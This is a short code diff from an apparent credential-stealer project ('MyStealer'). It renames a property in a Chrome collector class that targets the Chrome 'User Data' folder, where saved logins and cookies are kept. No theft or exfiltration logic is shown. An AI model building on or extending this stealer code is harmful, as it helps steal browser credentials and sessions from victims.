@@ -5,7 +5,7 @@ namespace MyStealer.Collector.Browser.ChromiumBased
 {
     public class Chrome : Chromium
     {
-        public override string ModuleName => "Chrome";
+        public override string Name => "Chrome";
 
         protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data");
     }
